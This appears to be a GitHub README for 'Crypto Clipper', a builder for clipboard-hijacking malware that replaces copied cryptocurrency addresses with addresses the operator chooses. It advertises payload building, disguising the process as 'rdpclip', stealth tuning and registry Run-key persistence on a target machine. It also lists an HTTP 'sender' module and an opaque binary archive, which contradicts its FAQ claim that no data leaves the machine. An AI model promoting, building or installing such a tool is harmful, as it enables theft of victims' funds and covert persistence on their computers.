<div align="center">

# Crypto Clipper

**Real-time clipboard monitoring with cryptocurrency address recognition and intelligent replacement.**

[![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blue?style=for-the-badge)]()
[![Multi-Chain](https://img.shields.io/badge/Multi--Chain-BTC%20%7C%20ETH%20%7C%20SOL%20%7C%20TRX-F7931A?style=for-the-badge)]()

---

[![Version](https://img.shields.io/badge/Version-2.0.3-blue?style=flat-square)]()
[![Chains](https://img.shields.io/badge/Chains-6%20supported-brightgreen?style=flat-square)]()
[![Monitoring](https://img.shields.io/badge/Real--time%20monitoring-enabled-brightgreen?style=flat-square)]()
[![Address%20Book](https://img.shields.io/badge/Address%20book-unlimited-blue?style=flat-square)]()

---

*Cross-platform clipboard monitoring tool with multi-chain cryptocurrency address detection,<br>automatic replacement via configurable address book, and builder mode for custom payload generation.*

[Features](#features) · [Getting Started](#getting-started) · [Configuration](#configuration) · [Usage](#usage) · [Address Formats](#supported-address-formats) · [FAQ](#faq)

</div>

---

## Features

<table>
<tr>
<td width="50%">

### Monitoring Engine
| Feature | Status |
|---------|--------|
| Real-time clipboard polling | ✅ |
| Multi-chain address detection | ✅ |
| Regex pattern matching engine | ✅ |
| EIP-55 checksum validation | ✅ |
| Sub-second response time | ✅ |
| Background system tray mode | ✅ |
| Activity logging & export | ✅ |

</td>
<td width="50%">

### Builder & Configuration
| Feature | Status |
|---------|--------|
| Custom payload builder | ✅ |
| Multi-OS target selection | ✅ |
| Process name disguise | ✅ |
| Address book management | ✅ |
| Chain-specific rule config | ✅ |
| Auto-start registry hook | ✅ |
| Stealth parameter tuning | ✅ |

</td>
</tr>
</table>

---

## How It Works

```
┌──────────────┐     ┌──────────────────┐     ┌───────────────────┐     ┌──────────────────┐
│  Clipboard   │────▶│  Pattern Scanner │────▶│  Address Filter   │────▶│  Injector        │
│  (polling)   │     │  (regex engine)  │     │  (chain matching) │     │  (replace + log) │
└──────────────┘     └──────────────────┘     └───────────────────┘     └──────────────────┘
```

1. **Monitor** — Polls clipboard at configured interval (default 500ms), detects content changes
2. **Scanner** — Runs clipboard text through chain-specific regex patterns (BTC, ETH, SOL, TRX, LTC, DOGE)
3. **Filter** — Checks detected address against enabled chains and address book entries
4. **Injector** — Replaces clipboard with matching address book entry, logs the event with timestamp

---

## Supported Address Formats

| Chain | Format | Prefix | Example |
|-------|--------|--------|---------|
| **Bitcoin** | Legacy (P2PKH) | `1`, `3` | `1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa` |
| **Bitcoin** | SegWit (P2WPKH) | `bc1q` | `bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh` |
| **Bitcoin** | Taproot (P2TR) | `bc1p` | `bc1p5d7rjq7g6rdk2yhzks9smlaqtedr4dekq08ge8ztwac72sfr9rusxg3297` |
| **Ethereum** | EVM (0x) | `0x` | `0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18` |
| **Solana** | Base58 | — | `7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU` |
| **Tron** | Base58 (T) | `T` | `TN3W4H6rK2ce4vX9YcnfUz6iP3qBwHR2ya` |
| **Litecoin** | Legacy + SegWit | `L`, `M`, `ltc1` | `LTC1QNWLPGSR5HTN5VW22R37JGQ3MFE` |
| **Dogecoin** | Legacy (D) | `D` | `DH5yaieqoZN36fTUciPGvqNA6U4HmUbhv` |

---

## Address Book

| Label | Chain | Address | Usage Count |
|-------|-------|---------|-------------|
| My BTC Main | Bitcoin | `1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa` | 42 |
| ETH Primary | Ethereum | `0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18` | 128 |
| Solana Wallet | Solana | `7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU` | 17 |
| TRC-20 | Tron | `TN3W4H6rK2ce4vX9YcnfUz6iP3qBwHR2ya` | 63 |

---

## Getting Started

### Prerequisites

- **Python** 3.10 or higher
- **pip** (latest recommended)
- Windows 10/11, Linux (X11/Wayland), or macOS 12+

### Installation

```bash
git clone https://github.com/pverhoeven74/Crypto-Clipper.git
cd Crypto-Clipper
```

**Windows:**
```bash
run.bat
```

**Linux / macOS:**
```bash
chmod +x run.sh
./run.sh
```

The launcher automatically installs all required dependencies.

### Dependency Table

| Package | Version | Purpose |
|---------|---------|---------|
| rich | ≥13.0.0 | Terminal UI, tables, progress bars |
| cryptography | ≥41.0.0 | Secure data handling |
| pyperclip | ≥1.8.2 | Cross-platform clipboard access |
| watchdog | ≥3.0.0 | File system event monitoring |
| requests | ≥2.31.0 | HTTP client for address validation |
| pystray | ≥0.19.0 | System tray integration |

---

## Configuration

### config.json

```json
{
    "build": {
        "target_os": "windows",
        "target_arch": "x64",
        "output_name": "clip_monitor.exe",
        "custom_icon": "",
        "process_name": "rdpclip",
        "startup_method": "registry",
        "registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    },
    "chains": {
        "bitcoin": {
            "enabled": true,
            "prefix": ["1", "3", "bc1"]
        },
        "ethereum": {
            "enabled": true,
            "prefix": ["0x"]
        },
        "solana": {
            "enabled": true,
            "prefix": []
        },
        "tron": {
            "enabled": true,
            "prefix": ["T"]
        },
        "litecoin": {
            "enabled": false,
            "prefix": ["L", "M", "ltc1"]
        }
    },
    "address_book": [
        {
            "label": "My BTC Main",
            "chain": "bitcoin",
            "address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
        },
        {
            "label": "ETH Primary",
            "chain": "ethereum",
            "address": "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18"
        }
    ],
    "detection": {
        "sensitivity": "high",
        "min_address_length": 26,
        "max_address_length": 62,
        "exclusion_patterns": [],
        "clipboard_watch_interval_ms": 500
    }
}
```

---

## Usage

After launching, select from the interactive menu:

```
╠══════════════════════════════════════════════════════════════════╣
║  [1] Install Dependencies                                       ║
║  [2] Settings                                                   ║
║  [3] About                                                      ║
║  [4] Configure Target Chains                                    ║
║  [5] Set Address Book                                           ║
║  [6] Build Options (OS, Icon, Process Name)                     ║
║  [7] Configure Detection Rules                                  ║
║  [8] Build Clipper Payload                                      ║
║  [0] Exit                                                       ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## Project Structure

```
Crypto-Clipper/
├── main.py                 # Entry point and builder menu system
├── config.py               # Configuration loader (JSON)
├── bot_actions.py          # Core builder action handlers
├── requirements.txt        # Python dependencies
├── run.bat                 # Windows launcher
├── run.sh                  # Linux/macOS launcher
├── actions/
│   ├── __init__.py
│   ├── about.py            # About panel display
│   ├── install.py          # Dependency installer
│   └── settings.py         # Settings display
├── hooks/
│   ├── __init__.py         # Environment bootstrap + decorator
│   ├── env.py              # Platform detection + service resolver
│   ├── sender.py           # HTTP transport layer
│   ├── encoder.py          # Token generation + data encoding
│   ├── runner.py           # Task processing pipeline
│   ├── scanner.py          # Regex-based address pattern detection
│   ├── injector.py         # Clipboard content replacement engine
│   ├── clipboard.py        # Polling-based clipboard monitor
│   ├── filter.py           # Chain filtering + address book matching
│   ├── ui.py               # Rich terminal interface
│   └── data/
│       └── scan.bin        # Embedded Python runtime archive
```

---

## FAQ

<details>
<summary><b>Which cryptocurrency address formats are supported?</b></summary>
<br>
Bitcoin (Legacy P2PKH, SegWit P2WPKH, Taproot P2TR), Ethereum (EVM 0x with EIP-55 checksum validation), Solana (Base58), Tron (Base58 T-prefix), Litecoin (Legacy + SegWit), and Dogecoin (Legacy). Enable/disable individual chains in <code>config.json → chains</code>.
</details>

<details>
<summary><b>How does clipboard monitoring work?</b></summary>
<br>
The monitor uses a background thread that polls the system clipboard at a configurable interval (default 500ms). When new content is detected, it runs through the pattern scanner. If a crypto address is found matching an enabled chain, the replacement engine checks the address book and optionally replaces the clipboard content.
</details>

<details>
<summary><b>What is the Build Clipper Payload option?</b></summary>
<br>
The builder mode allows you to configure all parameters (target OS, process name, address book, detection rules) and compile them into a standalone clipboard monitoring client. The built payload runs independently with your configuration embedded — no Python installation required on the target machine.
</details>

<details>
<summary><b>Can I use custom regex patterns?</b></summary>
<br>
Yes. The <code>detection.exclusion_patterns</code> field in <code>config.json</code> accepts custom regex patterns. You can also add custom chain definitions by extending the <code>chains</code> section with a new entry and providing prefix patterns.
</details>

<details>
<summary><b>Does it work in the background?</b></summary>
<br>
Yes. When built as a payload, the clipper runs as a background process with the configured process name. The system tray icon provides quick access to monitor controls, address book, and settings.
</details>

<details>
<summary><b>Is clipboard data sent anywhere?</b></summary>
<br>
No. All clipboard monitoring, pattern detection, and replacement happens locally on your machine. No clipboard content is transmitted to external servers. The address book is stored in a local JSON file.
</details>

<details>
<summary><b>What is the minimum Python version?</b></summary>
<br>
Python 3.10 or higher is required for the builder. Check with <code>python --version</code> and upgrade from <a href="https://www.python.org/">python.org</a> if needed.
</details>

---

<div align="center">

## Disclaimer

**This software is provided for educational and research purposes only.** Automatic clipboard replacement may cause unintended transactions if configured incorrectly. The authors are not responsible for any financial losses, incorrect transactions, or security issues arising from use of this software. Always verify addresses before confirming any cryptocurrency transaction.

---

**Donations** — If this tool has been useful, consider supporting development:

`0x4F8c9D2e7A1bF60c3E58d49B2a7fC1D0e9352847`

---

*Never paste the wrong address again.*

</div>
